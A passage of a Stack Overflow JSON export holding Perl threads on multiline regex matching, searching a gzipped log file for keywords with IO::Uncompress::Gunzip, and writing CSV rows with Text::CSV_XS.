multiple lines in between", "body": "<p>Try</p>\n\n<pre><code>/&lt;CFSC&gt;(.*)&lt;\\/CFSC&gt;/s\n</code></pre>\n\n<p>The final <code>s</code> makes the <code>.</code> match newline chars (<code>\\n</code> = 0x0a) which is usually doesn't match:</p>\n\n<blockquote>\n  <p>Treat string as single line. That is, change \".\" to match any\n  character whatsoever, even a newline, which normally it would not\n  match.</p>\n</blockquote>\n\n<p>from <a href=\"http://perldoc.perl.org/perlre.html#Modifiers\" rel=\"nofollow\">http://perldoc.perl.org/perlre.html#Modifiers</a></p>\n"}, {"comments": [{"owner": {"reputation": 25, "user_id": 6037578, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-cKW53sVA5Zk/AAAAAAAAAAI/AAAAAAAAARE/CTImwKXMiTs/photo.jpg?sz=128", "display_name": "pranay chhaparwal", "link": "https://stackoverflow.com/users/6037578/pranay-chhaparwal"}, "edited": false, "score": 0, "creation_date": 1462949934, "post_id": 37155099, "comment_id": 61847102, "body": "Thanks, i got the answer."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 3, "last_activity_date": 1462949468, "creation_date": 1462949468, "answer_id": 37155099, "question_id": 37154968, "link": "https://stackoverflow.com/questions/37154968/matching-two-chars-with-multiple-lines-in-between/37155099#37155099", "title": "matching two chars with multiple lines in between", "body": "<p>You need the <code>/s</code> <a href=\"http://perldoc.perl.org/perlre.html#Modifiers\" rel=\"nofollow\">single line modifier</a> to make the regex engine include line breaks in <code>.</code>.</p>\n\n<blockquote>\n  <p>Treat string as single line. That is, change \".\" to match any character whatsoever, even a newline, which normally it would not match.</p>\n</blockquote>\n\n<p>See this example.</p>\n\n<pre><code>my $foo = qq{&lt;CFSC&gt;cfsc_service=TRUE\nSEC=1\nlicenses=10\nexpires=20170511\n&lt;/CFSC&gt;};\n\n$foo =~ m{&gt;(.*)&lt;/CFSC&gt;}s;\n\nprint $1;\n</code></pre>\n\n<p>You also need to use a different delimiter than <code>/</code>, or escape it.</p>\n"}, {"tags": [], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "is_accepted": false, "score": 0, "last_activity_date": 1462979817, "creation_date": 1462979817, "answer_id": 37166877, "question_id": 37154968, "link": "https://stackoverflow.com/questions/37154968/matching-two-chars-with-multiple-lines-in-between/37166877#37166877", "title": "matching two chars with multiple lines in between", "body": "<p>Try this:</p>\n\n<pre><code>$foo =~ m/&lt;CFSC&gt;((?:(?!&lt;\\/CFSC&gt;).)*)&lt;\\/CFSC&gt;/gs;\n</code></pre>\n\n<p>Modifiers:</p>\n\n<pre><code>       g - Matches global\n       s - newline\n       i - case sensitive\n       \\ - escape sequence\n</code></pre>\n"}], "owner": {"reputation": 25, "user_id": 6037578, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-cKW53sVA5Zk/AAAAAAAAAAI/AAAAAAAAARE/CTImwKXMiTs/photo.jpg?sz=128", "display_name": "pranay chhaparwal", "link": "https://stackoverflow.com/users/6037578/pranay-chhaparwal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 29, "favorite_count": 0, "accepted_answer_id": 37155099, "answer_count": 3, "score": 1, "last_activity_date": 1462979817, "creation_date": 1462949093, "last_edit_date": 1462951685, "question_id": 37154968, "link": "https://stackoverflow.com/questions/37154968/matching-two-chars-with-multiple-lines-in-between", "title": "matching two chars with multiple lines in between", "body": "<p>I am new to regex and I am using Perl.</p>\n\n<p>I have below tag:</p>\n\n<pre><code>&lt;CFSC&gt;cfsc_service=TRUE\nSEC=1\nlicenses=10\nexpires=20170511\n&lt;/CFSC&gt;\n</code></pre>\n\n<p>I want to match anything between <code>&lt;CFSC&gt;</code> and <code>&lt;/CFSC&gt;</code> tags.</p>\n\n<p>I tried <code>/&lt;CFSC&gt;.*?\\n.*?\\n.*?\\n.*?\\n&lt;\\/CFSC&gt;/</code>\nand <code>/&lt;CFSC&gt;(.*)&lt;\\/CFSC&gt;/</code> but had no luck.</p>\n"}, {"tags": ["perl", "grep"], "comments": [{"owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "edited": false, "score": 2, "creation_date": 1462948151, "post_id": 37154195, "comment_id": 61846074, "body": "Generally the <code>while (&lt;&gt;)</code> line involves keyboard input. Perhaps this is why your script &quot;never completes&quot;."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "edited": false, "score": 0, "creation_date": 1462948495, "post_id": 37154195, "comment_id": 61846269, "body": "@red0ct is correct. What is the intention of the <code>while</code> loop? It wants you to input stuff. You&#39;re already looping the lines of <code>$logfile</code> with the <code>foreach</code> (although only once, because you don&#39;t call anything on the ::Gunzip object)."}, {"owner": {"reputation": 27, "user_id": 5495493, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/10206600852794644/picture?type=large", "display_name": "Michael Meis", "link": "https://stackoverflow.com/users/5495493/michael-meis"}, "edited": false, "score": 0, "creation_date": 1462948612, "post_id": 37154195, "comment_id": 61846336, "body": "The while loop was to keep it searching each line of the log file until it reaches the end. Did I go about that the wrong way?"}, {"owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "edited": false, "score": 2, "creation_date": 1462948854, "post_id": 37154195, "comment_id": 61846474, "body": "I think <code>while (&lt;$logfile&gt;)</code> will help you. Because AFAIK the object, returned by <code>IO::Uncompress::Gunzip-&gt;new</code> can be handled like normal filehandle.."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1462949765, "post_id": 37154195, "comment_id": 61847008, "body": "Also, why do you open Results.txt in read-write mode? You never use <code>@results</code>, and you don&#39;t write to <code>FILE</code> either. You have <code>strict</code> and <code>warnings</code>, and your code looks pretty good. Also use three-argument-open to make it even better. :)"}], "answers": [{"comments": [{"owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "edited": false, "score": 0, "creation_date": 1462962252, "post_id": 37155001, "comment_id": 61855251, "body": "@MichaelMeis Edited. Also look at <a href=\"http://stackoverflow.com/questions/3276674/which-one-is-good-practice-a-lexical-filehandle-or-a-typeglob\">this</a>"}], "tags": [], "owner": {"reputation": 4173, "user_id": 4450651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l6IMB.jpg?s=128&g=1", "display_name": "red0ct", "link": "https://stackoverflow.com/users/4450651/red0ct"}, "is_accepted": false, "score": 3, "last_activity_date": 1462958071, "last_edit_date": 1462958071, "creation_date": 1462949200, "answer_id": 37155001, "question_id": 37154195, "link": "https://stackoverflow.com/questions/37154195/search-a-compressed-log-file-against-a-list-of-keywords/37155001#37155001", "title": "Search a compressed log file against a list of keywords", "body": "<p>Probably there is no need in <code>while (&lt;&gt;)</code> loop in your script, because this line involves the input from keyboard.</p>\n\n<p>The object <code>$logfile</code> returned by <code>IO::Uncompress::Gunzip-&gt;new</code> <a href=\"http://perldoc.perl.org/IO/Uncompress/Gunzip.html#Constructor\" rel=\"nofollow\">constructor</a> can be handled like normal filehandle, so you could just do <code>while (&lt;$logfile&gt;)</code> like:</p>\n\n<pre><code>use IO::Uncompress::Gunzip qw($GunzipError);\nuse IO::Compress::Gzip qw(gzip $GzipError) ;\nuse strict;\nuse warnings;\nuse feature 'say';\n\n#...\nmy @loglines;\n\nopen my $fh, '&lt;/data/bro/scripts/Keywords.txt' or die \"$!\";\nmy %keywords = map { chomp; $_ =&gt; 0 } &lt;$fh&gt;;\nclose $fh;\n\nmy $logfile = IO::Uncompress::Gunzip-&gt;new( \"...\" )\n    or die \"IO::Uncompress::Gunzip failed: $GunzipError\\n\"; \n\nwhile (&lt;$logfile&gt;) {\n    my @line = split /\\t/;\n    next if ! $line[2];\n    for my $key (keys %keywords) {\n        if ($line[2] =~ /^$key/) { $keywords{$key}++; push @loglines, $_; say; last  }\n    }\n}\n# ... pack using gzip\n</code></pre>\n\n<p>So the <code>@loglines</code> array contains all lines from log, which contains one of your keywords at the beggining of third (<code>$line[2]</code>) splitted by '\\t' substring. The <code>%keywords</code> hash contains keywords as keys and their frequencies of occurrence as values.</p>\n\n<hr>\n\n<p><strong>NOTES</strong>(Edit): You can store loglines in hash, where each key could be a keyword and each value - an array/hash of matched lines (or substrings or both). I simply push matched lines into array just for example. You can do it as you need and then pack it with gzip in convenient way.<br>\nAlso it's better not to use the global names like <code>FILE</code> because in such case there is a risk to have other code using it by accident. Besides verify that you've successfully opened filehandle e.g. with <code>or die</code> as in example.</p>\n"}, {"comments": [{"owner": {"reputation": 27, "user_id": 5495493, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/10206600852794644/picture?type=large", "display_name": "Michael Meis", "link": "https://stackoverflow.com/users/5495493/michael-meis"}, "edited": false, "score": 0, "creation_date": 1462952972, "post_id": 37155207, "comment_id": 61849007, "body": "Thank you, I&#39;m still royally confused but I think this has me headed in the correct direction now. I&#39;m reading more up on gzip and researching the new errors I&#39;m having."}], "tags": [], "owner": {"reputation": 446, "user_id": 1399610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/62503824fd60ee77558d3d8d42c17b6e?s=128&d=identicon&r=PG", "display_name": "Snorri", "link": "https://stackoverflow.com/users/1399610/snorri"}, "is_accepted": false, "score": 1, "last_activity_date": 1462953329, "last_edit_date": 1462953329, "creation_date": 1462949766, "answer_id": 37155207, "question_id": 37154195, "link": "https://stackoverflow.com/questions/37154195/search-a-compressed-log-file-against-a-list-of-keywords/37155207#37155207", "title": "Search a compressed log file against a list of keywords", "body": "<p>IO::Uncompress::Gunzip->new returns an IO::Uncompress::Gunzip object.</p>\n\n<pre><code>foreach my $line ($logfile) { \n    while (&lt;&gt;) {\n      ...\n    }\n}\n</code></pre>\n\n<p>makes no sense, it just sets $line to the IO::Uncompress::Gunzip object and then waits for keyboard input.</p>\n\n<p>Instead try:</p>\n\n<pre><code>while (my $line = &lt;$logfile&gt;) {\n  ...\n}\n</code></pre>\n\n<p>You are also not using IO::Compress::Gzip correctly. You can create the IO::Compress::Gzip object before you process the logfile and use it with the print. Something like the following should work:</p>\n\n<pre><code>...\nmy $z = IO::Compress::Gzip-&gt;new(\"results.gz\")\n            or die \"IO::Compress::Gunzip failed: $GzipError\\n\";\nwhile (my $line = &lt;$logfile&gt;) {\n    my @F=split(\"\\t\", $line);\n        next unless ($F[2] =~ /^(199|168|151|162|166|150)/);\n\n    $count{ $F[2] }++;\n\n    if ($count{ $F[2] } == 10) {\n        print $z @{ $LOGLINES{$F[2]} };   # print all the log lines we've seen so far\n        print $z $line;                      # print the current line\n    } elsif ($count{ $F[2] } &gt; 10) {\n        print $z $line;                      # print the current line\n    } else {\n        push @{ $LOGLINES{$F[2]} }, $_; # store the log line for later use\n    }\n\n    my $flag_found = grep {exists $keywords{$_} } split /\\s+/, $line;\n    print $z $line if $flag_found;\n}\n</code></pre>\n\n<p>You should look at the documentation for IO::Uncompress::Gunzip and IO::Compress::Gzip (using perldoc or at cpan.org). It shows examples of the correct usage of these modules.</p>\n"}], "owner": {"reputation": 27, "user_id": 5495493, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/10206600852794644/picture?type=large", "display_name": "Michael Meis", "link": "https://stackoverflow.com/users/5495493/michael-meis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1462958071, "creation_date": 1462946459, "question_id": 37154195, "link": "https://stackoverflow.com/questions/37154195/search-a-compressed-log-file-against-a-list-of-keywords", "title": "Search a compressed log file against a list of keywords", "body": "<p>I am trying to open a log file, search it against a list of keywords, print every line that contained that keyword, and then compress the results file into a .gz. </p>\n\n<p>I have come up with the code below, which starts running with no compilation errors. It writes to the results file, but when I run the script it never completes and it never finds any results. Any help?</p>\n\n<pre><code>    #!/usr/bin/perl \n\nuse IO::Uncompress::Gunzip qw($GunzipError);\nuse IO::Compress::Gzip qw(gzip $GzipError) ;\nuse diagnostics;\nuse strict;\nuse warnings;\n\nmy %LOGLINES = ();\nmy %count = ();\n\nopen(FILE, \"&lt;/data/bro/scripts/Keywords.txt\"); \nmy %keywords = map { chomp $_; $_, 1 } &lt;FILE&gt;; \nclose(FILE);\n\nmy $logfile = IO::Uncompress::Gunzip-&gt;new( \"/data/bro/logs/2016-05-05/http.00:00:00-06:00:00.log.gz\" )\n    or die \"IO::Uncompress::Gunzip failed: $GunzipError\\n\"; \n\nopen(FILE, \"+&gt;Results.txt\"); \nmy @results = &lt;FILE&gt;; \n\nforeach my $line ($logfile) { \n    while (&lt;&gt;) {\n        my @F=split(\"\\t\");\n            next unless ($F[2] =~ /^(199|168|151|162|166|150)/);\n\n        $count{ $F[2] }++;\n\n        if ($count{ $F[2] } == 10) {\n            print @{ $LOGLINES{$F[2]} };   # print all the log lines we've seen so far\n            print $_;                      # print the current line\n        } elsif ($count{ $F[2] } &gt; 10) {\n            print $_;                      # print the current line\n        } else {\n            push @{ $LOGLINES{$F[2]} }, $_; # store the log line for later use\n        }\n\n    my $flag_found = grep {exists $keywords{$_} } split /\\s+/, $line;\n    print $line if $flag_found;\n    }\n}\nIO::Compress::Gzip(\"results.gz\")\n            or die \"IO::Compress::Gunzip failed: $GzipError\\n\";   \nclose(FILE); \n</code></pre>\n"}, {"tags": ["regex", "perl", "csv", "text", "format"], "comments": [{"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 5, "creation_date": 1462915338, "post_id": 37149051, "comment_id": 61836413, "body": "You may have noticed I keep editing your code to change the bracing and indentation. Where the braces and indentation go are very important to making code readable, and in particular to your question, to knowing what code is in what loop. Consider adapting this more commonly understood bracing style."}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 5, "creation_date": 1462915534, "post_id": 37149051, "comment_id": 61836493, "body": "At this point it feels like you&#39;re moving code around until something works without fully understanding what&#39;s going on. And we don&#39;t understand what you&#39;re trying to accomplish, so there&#39;s only so much we can do to help. So why don&#39;t you explain what you&#39;re trying to accomplish here? Give us specific inputs, like some short CSV data, a small example directory tree, and what you expect as the output."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462919185, "post_id": 37149051, "comment_id": 61837842, "body": "Here is what I see. You get directories in <code>@pairs</code>. For one file in each you fetch <code>$dist</code> and add it to <code>@results</code>. A guess: you want to write out a file with rows <code>directory | dist-line</code>.  The problem: what if <code>$dist</code> is found more than once or not found in a file?  Then <code>@pairs</code> and <code>@results</code> mismatch in length and it is not possible to simply write out the file. You&#39;d have to add some processing in the loop that would associate multiple-or-zero matches with directory for which they happen.  If there can be only <i>one</i> match, code is better written differently.  Is this making sense?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462993237, "post_id": 37149051, "comment_id": 61877106, "body": "Since this evolved into a new question I&#39;d suggest that you <a href=\"http://stackoverflow.com/help/someone-answers\">mark answers here accordingly</a>, so it is clear to future visitors just how this question worked out.  Post feedback if there are still problems with the particular question asked here."}], "answers": [{"tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 2, "last_activity_date": 1462915177, "creation_date": 1462915177, "answer_id": 37149160, "question_id": 37149051, "link": "https://stackoverflow.com/questions/37149051/perl-output-still-only-one-line/37149160#37149160", "title": "Perl: output still only one line", "body": "<p>Since <code>$csv-&gt;say</code> is at the end of the program, and it's not in a loop, it will only ever print one line. It will have every pair and every result.</p>\n\n<pre><code>$csv-&gt;say ($out, [@pairs, @result]);\n</code></pre>\n\n<p>I'm not sure what you're trying to accomplish, but you probably want to print your results inside a loop.</p>\n"}, {"comments": [{"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462951185, "post_id": 37149442, "comment_id": 61847957, "body": "I just need two columns in the final csv output: first column contains all the subdirectory names from <code>@pairs</code> and the second contains distances from <code>@results</code>... Am I mistaken in my approach?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462952894, "post_id": 37149442, "comment_id": 61848957, "body": "@AvaXue OK, thank you.  Please see my comment below your question --  can you have more than one match <code>$dist</code>  in a file, or is possible to have none?  If a file has more than one <code>$dist</code> line, how do you want to have that in the spreadsheet?  In that row you&#39;d have a cell with the directory name and then ... where do multiple <code>$dist</code> go? Or do you want a row for each, even for the same directory? If there can be only one such line per file, are you <i>sure</i> of that?  I am not sure I am explaining this well -- do you know what I mean?"}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462953671, "post_id": 37149442, "comment_id": 61849427, "body": "Yes, I&#39;m pretty sure there&#39;s always only one match <code>$dist</code> in each pairsAngles.txt under each subdirectory."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462953813, "post_id": 37149442, "comment_id": 61849510, "body": "@AvaXue Alright.  If you are &quot;<i>pretty sure</i>&quot; then it&#39;s easy, I&#39;ll add it shortly.  I am being careful because if an extra (or missing) one somehow sneaks in, using two arrays and assuming equal lengths can lead to bad behavior. I&#39;ll add a test for that."}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462958648, "post_id": 37149442, "comment_id": 61852689, "body": "From linux terimnal:  <code>Mismatching lengths of directory&#47;match arrays  at .&#47;test2.pl line 42, &lt;$subdir&gt; line 160.</code> line 42: <code>csv-&gt;say($out, [$pairs[$i], $result[$i]]);</code> The problem I think comes from either foreach or while..."}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462960073, "post_id": 37149442, "comment_id": 61853666, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/111620/discussion-between-ava-xue-and-zdim\">continue this discussion in chat</a>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462961320, "post_id": 37149442, "comment_id": 61854591, "body": "@AvaXue  Added sizes of arrays in the <code>die</code> print"}, {"owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462992954, "post_id": 37149442, "comment_id": 61876951, "body": "Thank you @zdim! I&#39;d prefer to continue with the new question :)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1462993254, "post_id": 37149442, "comment_id": 61877113, "body": "@AvaXue  Very well :)"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 2, "last_activity_date": 1462961290, "last_edit_date": 1462961290, "creation_date": 1462916466, "answer_id": 37149442, "question_id": 37149051, "link": "https://stackoverflow.com/questions/37149051/perl-output-still-only-one-line/37149442#37149442", "title": "Perl: output still only one line", "body": "<p>I don't see how you want to combine <code>@pairs</code> and <code>@result</code> in your output, but to write out the whole array into a spreadsheet you need, per synopsis in <a href=\"http://search.cpan.org/~hmbrand/Text-CSV_XS-1.23/CSV_XS.pm\" rel=\"nofollow\">Text::CSV_XS docs</a></p>\n\n<pre><code> $csv-&gt;say ($fh, $_) for @rows;\n</code></pre>\n\n<p>Let us know how <code>@pairs</code> and <code>@result</code> should be paired in output for more detail.</p>\n\n<hr>\n\n<p>A clarification: the written rows should have a cell for directory and another for the corresponding matching line, and we know for sure that there is exactly one such match in each file.  Then</p>\n\n<pre><code>if (@pairs != @result) {\n    die \"Mismatching lengths: directory \" . scalar(@pairs) .\n        \" vs matches \" . scalar(@result);\n}\nfor my $i (0..$#pairs) {\n    $csv-&gt;say($out, [$pairs[$i], $result[$i]]);\n} \n</code></pre>\n\n<p>Please note that <code>@pairs != @result</code> does <em>not</em> guard against all possible unexpected mismatches, it is more of a hint to include stricter checking in the code.  (There could be a no-match in one file but two in another and arrays would end up having the same length, for example.)  A check where <code>@result</code> is added to would test that there was indeed exactly one match.</p>\n\n<hr>\n\n<p>A note. The code at one place removes the new line with <code>chomp</code> but then puts it back, <code>\\n</code>.</p>\n\n<pre><code>chomp $dist;\npush (@result, \"$dist\\n\");\n</code></pre>\n\n<p>The <code>\\n</code> is not needed and then <code>\"\"</code> are not needed either -- just <code>push @result, $dist;</code>. As for the newline, either remove it with <code>chomp</code> or leave it (remove <code>chomp</code>). I don't see why a newline would be needed on a string that goes into a spreadsheet.</p>\n"}], "owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 185, "favorite_count": 0, "accepted_answer_id": 37149442, "answer_count": 2, "score": 0, "last_activity_date": 1462961290, "creation_date": 1462914652, "last_edit_date": 1462915265, "question_id": 37149051, "link": "https://stackoverflow.com/questions/37149051/perl-output-still-only-one-line", "title": "Perl: output still only one line", "body": "<p>This is the 3rd question on the same project: \nI was trying to grep string \"Distance: \" from \"pairsAngles.txt\" within each of over 2,000 subdirectories; the names of the subdirectories are obtained from a csv file.\nAfter passing eol => $/ to Text::CSV_XS->new AND use $csv->say, the output is still one line... </p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\nuse File::Find;\nuse Text::CSV_XS;\n\nmy @pairs=();\nmy @result=();\nmy $c1;\nmy $in;\nmy $out;\nmy $pairs;\nmy $dist = \"\";\nmy $dir = \"/home/avabelieve/aaPROJECT/helicalPair_ax/selectedPairs/renumberedPdb/clusterPairs-1.25-12-05_windows.12.resle3.2A.RMSD1.3/oligomerAngle\";\nmy $cluster = \"clst1.csv\";\nopen ($in, $cluster) || die \"cannot open \\\"$cluster\\\": $!\";\nmy $cU = \"clst1Updated.csv\";\nopen ($out, \"&gt;$cU\") || die \"cannot open '$cU' $!\";\nmy $csv = Text::CSV_XS-&gt;new ({ binary =&gt; 1, auto_diag =&gt; 1, eol =&gt; $/ });\n\nwhile ($c1 = &lt;$in&gt;) {\n    chomp $c1;\n    push @pairs, $c1;\n}\n\nforeach $c1 (@pairs) {\n    find (\\&amp;Matches, \"$dir/$c1\");\n    sub Matches {\n        open ($pairs, \"pairsAngles.txt\") or die \"$!\";\n\n        while (my $dist = &lt;$pairs&gt;) {\n\n            if ($dist =~ m/Distance: /) {                    \n                chomp $dist;\n                push (@result, \"$dist\\n\");\n            }               \n\n        } \n    }\n}\nchdir \"..\";\n\nif (not $csv-&gt;eof) {\n    $csv-&gt;error_diag();\n} \n\n$csv-&gt;say ($out, [@pairs, @result]);\nclose $out or die \"$!\";\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "edited": false, "score": 3, "creation_date": 1462913879, "post_id": 37148828, "comment_id": 61835608, "body": "<a href=\"http://perldoc.perl.org/functions/pop.html\" 